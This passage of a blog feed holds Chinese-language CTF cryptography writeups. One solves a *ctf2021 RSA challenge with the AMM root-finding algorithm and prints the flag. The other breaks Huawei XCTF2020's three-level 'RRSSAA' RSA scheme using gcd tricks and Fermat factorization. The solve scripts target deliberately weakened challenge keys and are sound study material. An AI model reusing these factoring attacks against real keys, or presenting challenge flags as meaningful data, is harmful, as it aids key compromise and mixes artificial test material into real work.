class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">21669699875387343975765484834175962461348837371447024695458479154615348697330944566714587217852888702291368306637977095490953192701450127798670425959768118384915082017373951315699899009631834471691811815393784748930880954114446745814058132752897827717077886547911476575751254872623927783670252969995075629255541621917767501261249192653546875104532649043219697616464205772025267019328364349763854659490144531087349974469079255236823096415094552037488277752927579909539401311624671444833332618177513356173537573280352724384376372955100031534236816681805396608147647003653628203258681097552049114308367967967184116839561</span></span><br><span class="line">p1 = <span class="number">125457275769068125757485908164006976153846494199951055956773829512867658202991509882220598391130551501414264867302691498062034690987771420463818096949614464177297177742292221196272475473441901790650971196178740160270878352307469807794533558079725928555246759355468676092854618354193968504322694550607414849887</span></span><br><span class="line">q1 = <span class="number">172725732665160218766764654273481422951178250693790825716359642314019315013321867434849375780994146440118500992456863730311444752367847389052666095324149584230474450693683416636565463345342017830651196454735159385924736453857045827989347928771104006978412412405607299616293396656259291378061505961429915687703</span></span><br><span class="line">e1 = <span class="number">20717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607</span></span><br><span class="line">d1 = <span class="number">36167461773898995192586226632578677184913220227461899855497899052924496298787</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="number">17653913822265292046140436077352027388518012934178497059850703004839268622175666123728756590505344279395546682262531546841391088108347695091027910544112830270722179480786859703225421972669021406495452107007154426730798752912163553332446929049057464612267870012438268458914652129391150217932076946886301294155031704279222594842585123671871118879574946424138391703308869753154497665630799300138651304835205755177940116680821142858923842124294529640719629497853598914963074656319325664210104788201957945801990296604585721820046391439235286951088086966253038989586737352467905401107613763487302070546247282406664431777475</span></span><br><span class="line">p = <span class="built_in">pow</span>(c1,d1,n1) + <span class="number">1</span></span><br><span class="line">n = <span class="number">22346087036331379968192118389403047568445805414881948978518580277027027486284293415097623011228506968071753709256352246733181304513713003096615266613365080909760605498017330085960699607777361429562376124376340215426398797920168016137830563564636922257215066266075494625782943973857490781916694118187094786034792437781964601089843549995939887939410763350338658901108020658475956489391300528691289604149598720803012371765770928211044755626045817053870803040863722458554924076011151695567147976903053993914859714631837755435592006986598006207692599019026644753575853382810261910332197447386727419606073948645238377595719</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line">cipher = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure><p><code>real_tirck</code>中给出了<code>e</code>的下界，以及告诉<code>e</code>和<code>phi</code>并不互素，所以我们猜测 $e\mid\varphi(n)$ （这里其实应该有证明的，有时间了再回来证），所以我们从下界爆破<code>e</code>，并使用AMM测试，能够跑出<code>flag</code>的即为正确的<code>e</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># About 3 seconds to run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">o, r, q</span>):</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    <span class="keyword">while</span> p ^ ((q-<span class="number">1</span>) // r) == <span class="number">1</span>:</span><br><span class="line">        p = g(random.randint(<span class="number">1</span>, q))</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = q - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // r</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (k * s + <span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alp = (k * s + <span class="number">1</span>) // r</span><br><span class="line">    a = p ^ (r**(t-<span class="number">1</span>) * s)</span><br><span class="line">    b = o ^ (r*alp - <span class="number">1</span>)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = b ^ (r^(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = - discrete_log(d, a)</span><br><span class="line">        b = b * (c^r)^j</span><br><span class="line">        h = h * c^j</span><br><span class="line">        c = c^r</span><br><span class="line">    result = o^alp * h</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllPRoot</span>(<span class="params">p, e</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    proot = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(proot) &lt; e:</span><br><span class="line">        proot.add(<span class="built_in">pow</span>(random.randint(<span class="number">2</span>, p-<span class="number">1</span>), (p-<span class="number">1</span>)//e, p))</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> proot</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllSolutions</span>(<span class="params">mp, proot, cp, p</span>):</span><br><span class="line">    start = time.time()</span><br><span class="line">    all_mp = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> root <span class="keyword">in</span> proot:</span><br><span class="line">        mp2 = mp * root % p</span><br><span class="line">        <span class="keyword">assert</span>(<span class="built_in">pow</span>(mp2, e, p) == cp)</span><br><span class="line">        all_mp.add(mp2)</span><br><span class="line">    end = time.time()</span><br><span class="line">    <span class="keyword">return</span> all_mp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">12732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406</span></span><br><span class="line">p = <span class="number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span></span><br><span class="line">q = <span class="number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span></span><br><span class="line">e = <span class="number">0x1337</span></span><br><span class="line">cp = c % p</span><br><span class="line">cq = c % q</span><br><span class="line">mp = AMM(cp, e, p)</span><br><span class="line">mq = AMM(cq, e, q)</span><br><span class="line">p_proot = findAllPRoot(p, e)</span><br><span class="line">q_proot = findAllPRoot(q, e)</span><br><span class="line">mps = findAllSolutions(mp, p_proot, cp, p)</span><br><span class="line">mqs = findAllSolutions(mq, q_proot, cq, q)</span><br><span class="line"><span class="built_in">print</span>(mps, mqs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    h = m.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>.fromhex(h).startswith(<span class="string">b&#x27;*CTF&#x27;</span>) <span class="keyword">or</span> <span class="built_in">bytes</span>.fromhex(h).startswith(<span class="string">b&#x27;*ctf&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(h))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">qwq = []</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(mpp), <span class="built_in">int</span>(mqq)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> check(solution):</span><br><span class="line">            <span class="built_in">print</span>(solution)</span><br><span class="line">            qwq.append(solution)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(qwq)</span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; s.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line"><span class="comment"># 1061.3823564052582 s.</span></span><br><span class="line"><span class="comment"># b&#x27;*CTF&#123;S0_Y0u_ARE_REA11Y_GOOd_At_Pla1_This&#125;Ifyoumissthetrainimonyouwillknowthatiamgoneyoucanheartheflagfluwwwwwwwwww&#x27;</span></span><br><span class="line"><span class="comment"># 5715792447162584004830995621288196364667316788985719423575200593843082226610550301623816157835166569193582787431644910982754181340491582409788340367828925355394884518044538804653367543125682677650052644197537897019515168750419392615178911318381369421233129629180441067485047</span></span><br></pre></td></tr></table></figure><h3 id="MyCurve"><a href="#MyCurve" class="headerlink" title="MyCurve"></a>MyCurve</h3><p>先放个神仙的sol和资料，有时间回来复现</p><p>binary edwards curve<br>这个曲线和正常的ecc有一个一一对应的映射<br>映射回去的曲线的阶光滑<br>容易算dlp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">name binary Edwards curves</span><br><span class="line">parameter d1</span><br><span class="line">parameter d2</span><br><span class="line">coordinate x</span><br><span class="line">coordinate y</span><br><span class="line">satisfying d1(x+y)+d2(x^2+y^2) = (x+x^2)(y+y^2)</span><br><span class="line">addition x = (d1(x1+x2)+d2(x1+y1)(x2+y2)+(x1+x1^2)(x2(y1+y2+1)+y1 y2)) / (d1+(x1+x1^2)(x2+y2))</span><br><span class="line">addition y = (d1(y1+y2)+d2(x1+y1)(x2+y2)+(y1+y1^2)(y2(x1+x2+1)+x1 x2)) / (d1+(y1+y1^2)(x2+y2))</span><br><span class="line">doubling x = (d1(x1+x1)+d2(x1+y1)(x1+y1)+(x1+x1^2)(x1(y1+y1+1)+y1 y1)) / (d1+(x1+x1^2)(x1+y1))</span><br><span class="line">doubling y = (d1(y1+y1)+d2(x1+y1)(x1+y1)+(y1+y1^2)(y1(x1+x1+1)+x1 x1)) / (d1+(y1+y1^2)(x1+y1))</span><br><span class="line">negation x = y1</span><br><span class="line">negation y = x1</span><br><span class="line">toweierstrass u = d1(d1^2+d1+d2)(x+y)/(x y+d1(x+y))</span><br><span class="line">toweierstrass v = d1(d1^2+d1+d2)(x/(x y+d1(x+y))+d1+1)</span><br><span class="line">a0 = 1</span><br><span class="line">a1 = 1</span><br><span class="line">a2 = d1^2+d2</span><br><span class="line">a3 = 0</span><br><span class="line">a4 = 0</span><br><span class="line">a6 = d1^4(d1^4+d1^2+d2^2)</span><br><span class="line">fromweierstrass x = d1(u+d1^2+d1+d2)/(u+v+(d1^2+d1)(d1^2+d1+d2))</span><br><span class="line">fromweierstrass y = d1(u+d1^2+d1+d2)/(v+(d1^2+d1)(d1^2+d1+d2))</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>最后摸了好久的鱼，不然就能AK了，呜呜，爬了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;WP-for-ctf2021&quot;&gt;&lt;a href=&quot;#WP-for-ctf2021&quot; class=&quot;headerlink&quot; title=&quot;WP for *ctf2021&quot;&gt;&lt;/a&gt;WP for *ctf2021&lt;/h1&gt;&lt;p&gt;第一次和V&amp;amp;N的师傅们打比赛就冲到了第六，好耶！&lt;/p&gt;
&lt;p&gt;最后没AK，不好（悲）&lt;/p&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Wp for 华为XCTF2020鸿蒙计算专场&#39;s crypto</title>
    <link href="http://example.com/2020/12/23/Wp-for-%E5%8D%8E%E4%B8%BAXCTF2020-s-crypto/"/>
    <id>http://example.com/2020/12/23/Wp-for-%E5%8D%8E%E4%B8%BAXCTF2020-s-crypto/</id>
    <published>2020-12-23T09:02:49.000Z</published>
    <updated>2021-03-11T01:21:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto"><a href="#Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto" class="headerlink" title="Wp for 华为XCTF2020鸿蒙计算专场’s crypto"></a>Wp for 华为XCTF2020鸿蒙计算专场’s crypto</h1><span id="more"></span><h2 id="RRSSAA"><a href="#RRSSAA" class="headerlink" title="RRSSAA"></a>RRSSAA</h2><p>题目分三个level，加密了三次，我们反过来解密就好了</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>观察<code>e</code>的生成代码，发现存在 $e&#x3D;4\times (1+k\times (p-1))+3$ 这一关系，即 $e&#x3D;7+k\times(p-1)$ ，所以由费马小定理有 $m^e&#x3D;m^7\ (mod\ p)$ ，所以可知 $p\mid m^e-m^7$ ，那么可以算出 $p&#x3D;gcd(m^e-m^7,n)$</p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>因为<code>t = next_prime(o) u = next_prime(s)</code>，所以<code>p1q1、p1q2、p2q1、p2q2</code>都比较相近，联想费马分解，因为 $n&#x3D;x^2-y^2&#x3D;(x+y)\times(x-y)&#x3D;a\times b$ ，所以我们使用费马分解在 $\sqrt{n}$ 附近寻找<code>x</code>并计算<code>y</code>，而此时我们得到的 <code>(x,y)</code> 则是<code>p1q1与p2q2</code>、<code>p1q2与p2p1</code>、<code>p1p2与q1q2</code>中的其中一个，那当我们得到两组合法的<code>(x,y)</code>后，即可通过<code>gcd</code>来得到<code>p1,p2,q1,q2</code>了</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>又是<code>next_prime</code>，观察到  $y$ 与 $21\cdot x$ 相近， $z$ 与 $3\cdot x\cdot y$ 相近，可知 $n &#x3D; x\cdot y\cdot z\approx 1363\cdot x^4$ ，所以我们在 $\sqrt[4]\frac{n}{1363}$ 的周围即可找到 $x$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#level3</span></span><br><span class="line">c4 = <span class="number">2223858574968933504319836040365324804971094330459462393944127171432282147604729897704345429059208580970050059952008010773685842392707183675848552727061753816604521338667996166424030688312622416918364914092916834363424563757848785094598668876885795408211613686469658206698800530604510586036849762682266643367887969834461905627352683770069831534697242348271330554339411094917823350455146582135451453515538908713886757653213973927096082</span>********************************************</span><br><span class="line">m4 = <span class="number">81225738828166640599054154023183465870678960906769673605358084529196871174429427936591822589995476552044227730868809310992934103731850597399114246762836121101348301079296663951503688072299542357013093324718850936925265954204973634470836187733828189312553819810470</span>********************************************</span><br><span class="line">c3 = <span class="number">23850649176609488069574576816416148886692179606070063605432689009210174812454985632639914109186048913143848105334392538145230671686367689762200590281089005923231195246579033646977003291454535177690932650527152046258702322882034275451509830373108765348015483098908530262342484124214979398113857256424921042629540596777935387076042051793448841426568428955677950006478374618351793957423993726834602082713108846572798935325391218935581430299</span>********************************************</span><br><span class="line">n3 = <span class="number">245027309396554072925434368973821962975166642272733206023979068786967233722428777765504465639508676248193528531220331147117321254335887247798699854774950988027443444489150326074699546422578258559318722819082323316238297250430318005357394321339486074483626412040345465814449044087548920371100312025734633992016258120056152646898775372319740238700067921969618291620584466621726342124271864707245999413528305460437729692977332395186047416381</span>********************************************</span><br><span class="line"></span><br><span class="line">p3 = gcd(c4 - <span class="built_in">pow</span>(m4,<span class="number">7</span>,n3),n3)</span><br><span class="line">q3 = n3 // p3</span><br><span class="line"><span class="keyword">assert</span> p3 * q3 == n3</span><br><span class="line">phi3 = (p3-<span class="number">1</span>) * (q3-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = getPrime(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span>(gcd(s,p3-<span class="number">1</span>) == <span class="number">1</span>):</span><br><span class="line">        sinv = invert(s,p3-<span class="number">1</span>)</span><br><span class="line">        e = <span class="number">4</span>*s*sinv+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span>(gcd(phi3,e) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">pow</span>(m4,e,n3)==c4):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">e3 = e</span><br><span class="line">d3 = invert(e3,phi3)</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3,d3,n3)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level3 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    get_context().precision = <span class="number">2048</span></span><br><span class="line">    x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        y2 = x ** <span class="number">2</span> - n</span><br><span class="line">        <span class="keyword">if</span> is_square(y2):</span><br><span class="line">            <span class="comment">#print(&#x27;x = &#x27;,x)</span></span><br><span class="line">            y2 = mpz(y2)</span><br><span class="line">            get_context().precision = <span class="number">2048</span></span><br><span class="line">            y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">            factor_list.append([x+y, x-y])</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="comment">#level2</span></span><br><span class="line">c2 = m3</span><br><span class="line">n2 = <span class="number">87994385997075478104135902527696370476697303732829349373685150934389771812000800579489779988597377758155357032119662485786694473083701713238817766110307526481354801968791624978964643229368334587752275506234350005276147810555241459363533576625362804706641125169760333584993303919294358578117889235906667830900166286169</span>********************************************</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">factor_list = fermat_factorization(n2)</span><br><span class="line">[X1, Y1] = factor_list[<span class="number">0</span>]</span><br><span class="line">[X2, Y2] = factor_list[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n2</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n2</span><br><span class="line">p21 = gcd(X1, X2)</span><br><span class="line">q21 = X1 // p21</span><br><span class="line">p22 = gcd(Y1, Y2)</span><br><span class="line">q22 = Y1 // p22</span><br><span class="line"><span class="keyword">assert</span> p21 *p22 * q21 * q22 == n2</span><br><span class="line">phi2 = (p21 - <span class="number">1</span>) * (q21 - <span class="number">1</span>) * (p22 - <span class="number">1</span>) * (q22 - <span class="number">1</span>)</span><br><span class="line">d2 = inverse(e2,phi2)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level2 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#level1</span></span><br><span class="line">c1 = m2</span><br><span class="line">n1 = <span class="number">72968331464378596578736213097836639538889759902365332315018563128110329234698340288949958887638828272808811489147149910844881732898599415772529999325992095319128544723262119362648159655825918097703197797125275721741525608198285972415832787315444112461546745146260018587323632627512444194155444076538738583091</span>********************************************</span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">base = iroot(n1//<span class="number">21</span>//<span class="number">63</span>,<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">10000</span>,<span class="number">10000</span>):</span><br><span class="line">    x = base + i</span><br><span class="line">    <span class="keyword">if</span>(isPrime(x)):</span><br><span class="line">        y = next_prime(<span class="number">21</span>*x)</span><br><span class="line">        z = next_prime(<span class="number">3</span>*x*y)</span><br><span class="line">        <span class="keyword">if</span>(x*y*z==n1):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level1 passed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phi1 = (x-<span class="number">1</span>) * (y-<span class="number">1</span>) * (z-<span class="number">1</span>)</span><br><span class="line">d1 = inverse(e1,phi1)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line">flag = long_to_bytes(m1)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/23/ghpPnrLlq2FT8RI.png" alt="27.png"> </p><h2 id="combinelfsr"><a href="#combinelfsr" class="headerlink" title="combinelfsr"></a>combinelfsr</h2><p>没看，想起来了就复现，爬了</p><h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>没看，想起来了就复现，爬了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto&quot;&gt;&lt;a href=&quot;#Wp-for-华为XCTF2020鸿蒙计算专场’s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Wp for 华为XCTF2020鸿蒙计算专场’s crypto&quot;&gt;&lt;/a&gt;Wp for 华为XCTF2020鸿蒙计算专场’s crypto&lt;/h1&gt;</summary>
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
</feed>
